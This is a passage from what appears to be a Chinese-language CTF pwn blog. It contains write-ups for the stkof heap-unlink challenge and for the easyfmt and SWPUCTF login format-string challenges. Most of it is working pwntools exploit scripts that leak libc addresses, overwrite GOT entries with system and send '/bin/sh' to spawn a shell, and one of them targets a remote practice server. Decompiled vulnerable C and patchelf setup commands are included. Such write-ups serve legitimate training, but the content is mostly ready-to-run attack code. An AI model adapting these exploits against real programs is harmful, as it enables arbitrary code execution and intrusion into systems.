<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#p = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;, &quot;./stkof&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./lib/libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,29966)</span></span><br><span class="line">p=process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/syearn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 &quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x00400760</span></span><br><span class="line">atoi_got=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;OK\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,text</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(text)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;OK\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#debug(0)</span></span><br><span class="line">fd=<span class="number">0x602140</span>+<span class="number">0x10</span>-<span class="number">0x18</span></span><br><span class="line">bk=<span class="number">0x602140</span>+<span class="number">0x10</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x50</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload=payload.ljust(<span class="number">0x50</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x50</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">debug(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload=p64(puts_plt)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">base=addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=base+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">6</span>,p64(system_addr))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个exp在pwndocker中不能用，应该是pwndocker libc版本问题，用patchelf 换libc后本地打通</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>chunk</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串</title>
    <url>/2024/02/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p>关于格式化字符串漏洞的题目</p>
<span id="more"></span>
<h2 id="wdb-2018-2nd-easyfmt（格式化字符串-更换可执行文件libc）"><a href="#wdb-2018-2nd-easyfmt（格式化字符串-更换可执行文件libc）" class="headerlink" title="wdb_2018_2nd_easyfmt（格式化字符串+ 更换可执行文件libc）"></a>wdb_2018_2nd_easyfmt（格式化字符串+ 更换可执行文件libc）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know repeater?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>覆写printf的got表（通过格式化字符串）为system地址（ret2libc获得system地址），然后输入binsh</p>
</li>
<li><p>泄露libc基地址：(%6$s)</p>
</li>
</ul>
<p>通过puts函数的got表得出libc_base，（真实地址-偏移）</p>
<p><strong>偏移通过更换程序libc，然后gdb调试得出</strong></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./easyfmt&quot;</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;./easyfmt&quot;</span>)</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;puts_got: &quot;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload=p32(puts_got)+<span class="string">b&quot;%6$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">puts_ad=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">base=puts_ad-<span class="number">0x5fcb0</span></span><br><span class="line">system_ad=base+<span class="number">0x3adb0</span></span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_ad&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




<h3 id="更换libc"><a href="#更换libc" class="headerlink" title="更换libc"></a>更换libc</h3><ul>
<li>glibc-all-in-one</li>
</ul>
<p><code>./update_list</code></p>
<p><code>cat list</code></p>
<p><code>./download (版本)</code></p>
<ul>
<li>patchelf(以上面easyfmt为例)</li>
</ul>
<p><code>patchelf --set-interpreter /home/nefunsi/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so ./easyfmt</code></p>
<p><code>patchelf --set-rpath /home/nefunsi/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386 ./easyfmt</code></p>
<h2 id="SWPUCTF-2019-login（bss段格式化字符串）"><a href="#SWPUCTF-2019-login（bss段格式化字符串）" class="headerlink" title="SWPUCTF_2019_login（bss段格式化字符串）"></a>SWPUCTF_2019_login（bss段格式化字符串）</h2><p><a href="https://zhuanlan.zhihu.com/p/130271689">深入理解GOT表和PLT表 - 知乎 (zhihu.com)</a></p>
<p><a href="https://saurlax.com/posts/patchelf%E4%B8%8Eglibc-all-in-one%E4%BD%BF%E7%94%A8.html">更换libc</a></p>
<p><code>%hhn</code> 的参数是指向 char 类型变量的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_804B080, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Base maybe not easy......&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_80485E3();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_80485E3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello, %s&quot;</span>, byte_804B080);</span><br><span class="line">  <span class="keyword">return</span> sub_804854B();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_804854B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your password: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[read(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;<span class="comment">//0804B0A0</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;wllmmllw&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the wrong password: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Login successfully! Have fun!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="先将printf-got表写入栈上，再修改printf-got内容为system，然后输入binsh就可以get-shell了"><a href="#先将printf-got表写入栈上，再修改printf-got内容为system，然后输入binsh就可以get-shell了" class="headerlink" title="先将printf_got表写入栈上，再修改printf_got内容为system，然后输入binsh就可以get shell了"></a>先将printf_got表写入栈上，再修改printf_got内容为system，然后输入binsh就可以get shell了</h3><p>栈：$6-&gt;$10-&gt;$14</p>
<p><img src="/img/stack.png"></p>
<ul>
<li>先泄露libc地址（libc用buu提供的）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0xf1</span>-libc.sym[<span class="string">&#x27;_libc_start_main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span>+ <span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system: &#x27;</span>+ <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>然后泄露栈地址（$6处）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$10_addr</span></span><br><span class="line">payload1=<span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack0=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack0= &#x27;</span>+ <span class="built_in">hex</span>(stack0))</span><br><span class="line"><span class="comment">#$14_addr</span></span><br><span class="line">payload2=<span class="string">b&#x27;%10$p&#x27;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack1 =&#x27;</span>+ <span class="built_in">hex</span>(stack1))</span><br></pre></td></tr></table></figure>




<ul>
<li>然后将printf的got表写到栈上(0x804b014)</li>
<li>$10写$14指向</li>
<li>改$14-&gt;printf_got</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1=<span class="string">&#x27;%20c%10$hhn&#x27;</span> <span class="comment">#/x14</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>然后改$15-&gt;printf_got+1(因为后面必须一次改写为system)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">satck1 +=<span class="number">4</span></span><br><span class="line"></span><br><span class="line">p0=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p0)</span><br><span class="line">p1=<span class="string">&#x27;%21c%10$hhn&#x27;</span> <span class="comment">#/x15</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br></pre></td></tr></table></figure>



<ul>
<li>恢复$14</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">paylaod3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack1-<span class="number">4</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,paylaod3)</span><br></pre></td></tr></table></figure>



<ul>
<li>最后一次性将printf_got指向system地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((system&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%14$hhn&#x27;</span></span><br><span class="line">payload4+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((system&amp;<span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)-<span class="number">0x10</span>)+<span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,payload4)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./login&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27355</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./buu_libc/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password: \n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0xf1</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system: &#x27;</span>+ <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#$10_addr</span></span><br><span class="line">payload1=<span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack0=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack0= &#x27;</span>+ <span class="built_in">hex</span>(stack0))</span><br><span class="line"><span class="comment">#$14_addr</span></span><br><span class="line">payload2=<span class="string">b&#x27;%10$p&#x27;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;stack1 =&#x27;</span>+ <span class="built_in">hex</span>(stack1))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p1=<span class="string">&#x27;%20c%10$hhn&#x27;</span> <span class="comment">#/x14</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br><span class="line"></span><br><span class="line">stack1 +=<span class="number">4</span></span><br><span class="line"></span><br><span class="line">p0=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p0)</span><br><span class="line">p1=<span class="string">&#x27;%21c%10$hhn&#x27;</span> <span class="comment">#/x15</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">p2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p2)</span><br><span class="line">p3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span> <span class="comment">#/xb0</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p3)</span><br><span class="line"></span><br><span class="line">p4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p4)</span><br><span class="line">p5=<span class="string">&#x27;%4c%10$hhn&#x27;</span> <span class="comment">#/x04</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p5)</span><br><span class="line"></span><br><span class="line">p6=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1&amp;<span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p6)</span><br><span class="line">p7=<span class="string">&#x27;%8c%10$hhn&#x27;</span><span class="comment">#/x08</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,p7)</span><br><span class="line"></span><br><span class="line">paylaod3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack1-<span class="number">4</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,paylaod3)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((system&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%14$hhn&#x27;</span></span><br><span class="line">payload4+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((system&amp;<span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)-<span class="number">0x10</span>)+<span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;again!\n&#x27;</span>,payload4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;again!\n&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">             </span><br></pre></td></tr></table></figure>

<p>远程打通，但本地没，换过libc了，不太清楚，gdb停在system处退出</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
</search>
